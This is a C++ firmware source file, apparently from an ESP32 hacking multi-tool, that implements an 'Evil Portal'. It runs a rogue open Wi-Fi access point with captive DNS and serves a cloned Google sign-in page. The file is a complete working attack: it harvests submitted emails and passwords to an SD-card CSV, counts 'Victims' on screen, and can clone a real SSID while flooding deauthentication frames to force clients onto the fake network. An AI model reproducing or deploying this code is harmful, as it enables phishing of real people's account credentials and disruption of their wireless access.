#include "evil_portal.h"
#include "globals.h"
#include "mykeyboard.h"
#include "wifi_common.h"
#include "sd_functions.h"
#include "wifi_atks.h"

AsyncWebServer *ep;               // initialise webserver
DNSServer dnsServer;

String html_file, ep_logo, last_cred;
String AP_name = "Free Wifi";
int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsHtml = "";

// Default Drauth Frame
const uint8_t deauth_frame_default2[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html");
    if(request->hasParam("ssid")) request->redirect("/ssid");         // If there is a parameter called "ssid", changes network
    else if(request->params()>0) {                                    // Else if there are other parameters, store in the memory
      String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
      String csvLine = "";
      last_cred="";
      for (int i = 0; i < request->params(); i++) {
        AsyncWebParameter *param = request->getParam(i);
        html_temp += param->name() + ": " + param->value() + "<br>\n";
        // Prepara dados para salvar no SD
        if (i != 0) {
          csvLine += ",";
          last_cred +=",";
        }
        csvLine += param->name() + ": " + param->value();
        last_cred += param->name().substring(0,1) + ": " + param->value();
      }
      html_temp += "</li>\n";
      saveToCSV("/Bruce_creds.csv", csvLine);
      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
      totalCapturedCredentials++;
      request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."));
    }
    else {
      request->redirect("/");
    }
  }
};

void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
    int tmp=millis(); // one deauth frame each 30ms at least
    bool redraw=true;
    Serial.begin(115200);
    // Definição da matriz "Options"
    options = {
        {"Default", [=]()       { chooseHtml(false); }},
        {"Custom Html", [=]()   { chooseHtml(true); }},
    };
    delay(200);
    loopOptions(options);

    while(checkNextPress()){ yield(); } // debounce
    delay(200);
    //  tssid="" means that are opening a virgin Evil Portal
    if (tssid=="")  {
      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
      }
    else { // tssid != "" means that is was cloned and can deploy Deauth
      //memcpy(ap_record.bssid, bssid, 6);
      memcpy(deauth_frame, deauth_frame_default2, sizeof(deauth_frame_default2));
      wsl_bypasser_send_raw_frame(&ap_record,channel);
      AP_name = tssid;
    }

    wifiConnected=true;
    drawMainBorder();
    displayRedStripe("Starting..",TFT_WHITE,bruceConfig.priColor);

    IPAddress AP_GATEWAY(172, 0, 0, 1);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
    WiFi.softAP(AP_name,emptyString,channel);

    tmp=millis();
    while(millis() - tmp < 3000) yield();
    dnsServer.start(53, "*", WiFi.softAPIP());
    ep = new AsyncWebServer(80);

    // if url isn't found
    ep->onNotFound([](AsyncWebServerRequest * request) {
      request->redirect("/");
    });

    ep->on("/creds", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(200, "text/html", creds_GET());
    });

    ep->on("/ssid", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(200, "text/html", ssid_GET());
    });

    ep->on("/postssid", HTTP_GET, [](AsyncWebServerRequest * request) {
      if(request->hasArg("ssid")) AP_name = request->arg("ssid").c_str();
      request->send(200, "text/html", ssid_POST());
      ep->end();                            // pára o servidor
      wifiDisconnect();                     // desliga o WiFi
      WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
      ep->begin();                          // reinicia o servidor
      previousTotalCapturedCredentials=-1;  // redesenha a tela
    });

    ep->on("/clear", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(200, "text/html", clear_GET());
    });

    ep->on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(200, "text/html", html_file);
    });

    ep->addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); //only when requested from AP

    log_d("Total heap: %d", ESP.getHeapSize());
    log_d("Free heap: %d", ESP.getFreeHeap());
    log_d("Total PSRAM: %d", ESP.getPsramSize());
    log_d("Free PSRAM: %d", ESP.getFreePsram());

    if(psramFound()) ep = (AsyncWebServer*)ps_malloc(sizeof(AsyncWebServer));
    else ep = (AsyncWebServer*)malloc(sizeof(AsyncWebServer));

    new (ep) AsyncWebServer(80);

    ep->begin();
    tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, bruceConfig.bgColor);

    bool hold_deauth = false;
    tmp=millis(); // one deauth frame each 30ms at least
    redraw=true;
    while(1) {
      if(redraw) {
        drawMainBorder();
        tft.setTextSize(FM);
        tft.setTextColor(TFT_RED);
        tft.drawCentreString("Evil Portal",WIDTH/2, 29, SMOOTH_FONT);
        tft.setCursor(7,49);
        tft.setTextColor(bruceConfig.priColor);
        tft.println("AP: " + AP_name);
        tft.setCursor(7,tft.getCursorY());
        tft.println("->" + WiFi.softAPIP().toString() + "/creds");
        tft.setCursor(7,tft.getCursorY());
        tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
        tft.setCursor(7,tft.getCursorY());
        tft.print("Victims: ");
        tft.setTextColor(TFT_RED);
        tft.println(String(totalCapturedCredentials));
        tft.setCursor(7,tft.getCursorY());
        tft.setTextSize(FP);
        tft.println(last_cred);

        if (deauth){
          if (hold_deauth) {
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor);
            tft.drawRightString("Deauth OFF", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
          } else {
            tft.setTextSize(FP);
            tft.setTextColor(TFT_RED);
            tft.drawRightString("Deauth ON", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
          }
        }

        //menu_op.pushSprite(8,26);
        redraw=false;
      }

      if(!hold_deauth && (millis()-tmp) >5)  {
        wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
        tmp=millis();
      }

      if(checkSelPress() && deauth) {
        while(checkSelPress()) { delay(80); } // timerless debounce
        hold_deauth = !hold_deauth;
        redraw=true;
      }
      if(totalCapturedCredentials!=(previousTotalCapturedCredentials+1)) {
        redraw=true;
        previousTotalCapturedCredentials = totalCapturedCredentials-1;
      }
      dnsServer.processNextRequest();

      if(checkEscPress()) break;

    }
    ep->reset();
    ep->end();
    ep->~AsyncWebServer();
    free(ep);
    ep = nullptr;

    delay(100);
    wifiDisconnect();
}

// Função para salvar dados no arquivo CSV
void saveToCSV(const String &filename, const String &csvLine) {
  File file = SD.open(filename, FILE_APPEND);
  if (!file) {
    Serial.println("Error to open file");
    return;
  }
  file.println(csvLine);
  file.close();
  Serial.println("data saved");
}

String getHtmlContents(String body) {
  PROGMEM String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + AP_name + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <center>"
                   "        " + ep_logo +
                   "      </center>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String ssid_GET() {
  return getHtmlContents("<p>Set a new SSID for EVIL Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+AP_name+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}
String ssid_POST() {
  return getHtmlContents("EVIL Portal shutting down and restarting with SSID <b>" + AP_name + "</b>. Please reconnect.");
}

String index_GET() {
  String loginTitle = String("Sign in");
  String loginSubTitle = String("Use your Google Account");
  String loginEmailPlaceholder = String("Email");
  String loginPasswordPlaceholder = String("Password");
  String loginMessage = String("Please log in to browse securely.");
  String loginButton = String("Next");

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}
String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

void chooseHtml(bool def) {
  ep_logo = "<div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>";
  if(def) {
      html_file = loopSD(true);
      if(html_file.endsWith(".html")) {
        ep_logo = "";
        File html = SD.open(html_file, FILE_READ);
        html_file = html.readString();
      } else {
        html_file = index_GET();
      }
  } else {
    html_file = index_GET();
  }
}
